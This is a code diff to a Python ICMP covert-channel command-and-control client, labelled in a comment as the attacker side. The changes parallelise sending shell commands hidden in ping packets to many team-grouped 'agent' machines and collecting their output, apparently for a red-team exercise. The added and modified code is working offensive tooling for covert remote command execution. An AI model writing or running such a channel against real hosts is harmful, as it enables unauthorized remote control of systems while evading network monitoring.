@@ -17,6 +17,7 @@ import time
 import argparse
 import re
 from itertools import zip_longest
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 
 GREEN = "\033[92m"
@@ -117,7 +118,7 @@ def send_icmp_echo(dest_addr, data, icmp_id=None, icmp_seq=1):
     
     icmp_type, icmp_code = 8, 0  
     icmp_checksum = 0
-    icmp_id = icmp_id or (os.getpid() & 0xFFFF)
+    icmp_id =  icmp_id or ip_to_icmp_id(dest_addr)
     
     icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
     checksum = calculate_checksum(icmp_header + data)
@@ -134,6 +135,26 @@ def send_icmp_echo(dest_addr, data, icmp_id=None, icmp_seq=1):
     
     return icmp_socket, icmp_id
 
+def display_status():
+    command = "hostname"
+    seq = 0
+    machine_responses = {}
+    targets = []
+    for team in agent_ips:
+        for machine in agent_ips[team]:
+            targets.append(agent_ips[team][machine])
+
+    with ThreadPoolExecutor(max_workers=60) as executor:
+        futures = [
+            executor.submit(query_machine, target, command, seq)
+            for target in targets
+        ]
+
+        for future in as_completed(futures):
+            ip, cmd_response, ack_response = future.result()
+            machine_responses[ip] = cmd_response
+
+    print_teams_in_columns(agent_ips, machine_responses)
 
 def receive_icmp_echo(icmp_socket, expected_id, timeout=TIMEOUT, max_responses=MAX_RESPONSES):
     log(f"Waiting for up to {max_responses} ICMP Echo Replies with ID: {expected_id}")
@@ -178,9 +199,35 @@ def receive_icmp_echo(icmp_socket, expected_id, timeout=TIMEOUT, max_responses=M
         log("Timeout waiting for ICMP Echo Reply")
     return responses
 
+def ip_to_icmp_id(ip: str) -> int:
+    t, m = map(int, (ip.split(".")[1], ip.split(".")[3]))
+    return (t << 8) | m
+
+def query_machine(ip, command, seq):
+    icmp_id = ip_to_icmp_id(ip)
+    
+    full_command = COMMAND_PREFIX + command.encode()
+    icmp_socket, sent_id = send_icmp_echo(ip, full_command, icmp_id, seq)
+    
+    responses = receive_icmp_echo(icmp_socket, sent_id, max_responses=2)
+    icmp_socket.close()
+
+    ack_response = None
+    cmd_response = None
+
+    for icmp_type, response in responses:
+        try:
+            if response.startswith(COMMAND_PREFIX):
+                ack_response = response[len(COMMAND_PREFIX):].decode(errors='replace').strip()
+            elif response.startswith(RESPONSE_PREFIX):
+                cmd_response = response[len(RESPONSE_PREFIX):].decode(errors='replace').strip()
+        except Exception as e:
+            log(f"[{ip}] Error processing response: {e}")
+
+    return ip, cmd_response, ack_response
+
 # Client (attacker)
-def client(dest_addrs):
-    icmp_id = os.getpid() & 0xFFFF
+def client(targets):
     seq = 0
     machine_outputs = {}
 
@@ -197,44 +244,30 @@ def client(dest_addrs):
             continue 
 
         seq += 1
-        full_command = COMMAND_PREFIX + command.encode()
         
-        for dest_addr in dest_addrs:
-            icmp_socket, sent_id = send_icmp_echo(dest_addr, full_command, icmp_id, seq)
-            responses = receive_icmp_echo(icmp_socket, sent_id, max_responses=2)
-            icmp_socket.close()
-            team, machine = find_team_machine_by_ip(agent_ips, dest_addr)
+        with ThreadPoolExecutor(max_workers=60) as executor:
+            futures = [
+                executor.submit(query_machine, target, command, seq)
+                for target in targets
+            ]
 
-            ack_response = None
-            cmd_response = None
-            
-            for icmp_type, response in responses:
-                try:
-                    if response.startswith(COMMAND_PREFIX):
-                        ack_response = response[len(COMMAND_PREFIX):].decode(errors='replace').strip()
-                    elif response.startswith(RESPONSE_PREFIX):
-                        cmd_response = response[len(RESPONSE_PREFIX):].decode(errors='replace').strip()
-                    else:
-                        log(f"Unexpected response format: {response[:50]}...")
-                except Exception as e:
-                    log(f"Error processing response: {e}")
-            
+        for future in as_completed(futures):
+            ip, cmd_response, ack_response = future.result()
+            team, machine = find_team_machine_by_ip(agent_ips, ip)
             if ack_response:
                 print(f"\n{BLUE}[*]{RESET} Command Acknowledgement for {team}-{machine}: {ack_response}")
             else:
                 print(f"\n{RED}[WARN]{RESET} No command acknowledgement received for {team}-{machine}")
-
             if cmd_response:
                 print(f"\n{BLUE}[*]{RESET} Command output received from {team}-{machine}")
-                if len(dest_addrs) == 1:
+                if len(targets) == 1:
                     print(cmd_response)
-                machine_outputs[dest_addr] = cmd_response
+                machine_outputs[ip] = cmd_response
             else:
                 print(f"\n{RED}[WARN]{RESET} No command output received for {team}-{machine}")
-                machine_outputs[dest_addr] = "No output"
-            
-            if not responses:
-                print(f"{RED}[WARN]{RESET} No valid responses received for {team}-{machine}")
+                machine_outputs[ip] = "No output"
+        
+
         
         print()  # Blank line for readability
 
@@ -253,9 +286,10 @@ def print_teams_in_columns(agent_ips, machine_responses, columns=3):
     blocks = []
 
     for team in agent_ips:
-        block = [f"{team}"]
+        block = [f"  {team}"]
         for machine in agent_ips[team]:
-            color = GREEN if machine_responses.get(machine) else RED
+            ip = agent_ips[team][machine]
+            color = GREEN if machine_responses.get(ip) else RED
             block.append(f"  {color}{machine}{RESET}")
         blocks.append(block)
 
@@ -266,38 +300,6 @@ def print_teams_in_columns(agent_ips, machine_responses, columns=3):
         for lines in zip_longest(*row_blocks, fillvalue=""):
             print("".join(pad_ansi(line, col_width) for line in lines))
         print()
-
-def display_status():
-    command = "hostname"
-    icmp_id = os.getpid() & 0xFFFF
-    seq = 0
-    machine_responses = {}
-    for machine in agent_ips:
-        full_command = COMMAND_PREFIX + command.encode()
-        icmp_socket, sent_id = send_icmp_echo(machine, full_command, icmp_id, seq)
-        responses = receive_icmp_echo(icmp_socket, sent_id, max_responses=2)
-        icmp_socket.close()
-
-        ack_response = None
-        cmd_response = None
-        
-        for icmp_type, response in responses:
-            try:
-                if response.startswith(COMMAND_PREFIX):
-                    ack_response = response[len(COMMAND_PREFIX):].decode(errors='replace').strip()
-                elif response.startswith(RESPONSE_PREFIX):
-                    cmd_response = response[len(RESPONSE_PREFIX):].decode(errors='replace').strip()
-                else:
-                    log(f"Unexpected response format: {response[:50]}...")
-            except Exception as e:
-                log(f"Error processing response: {e}")
-        
-        if cmd_response:
-            machine_responses[machine] = cmd_response
-        else:
-            machine_responses[machine] = None
-        
-    print_teams_in_columns(agent_ips, machine_responses)
 
 if __name__ == "__main__":
     MAX_PACKET_SIZE = args.size
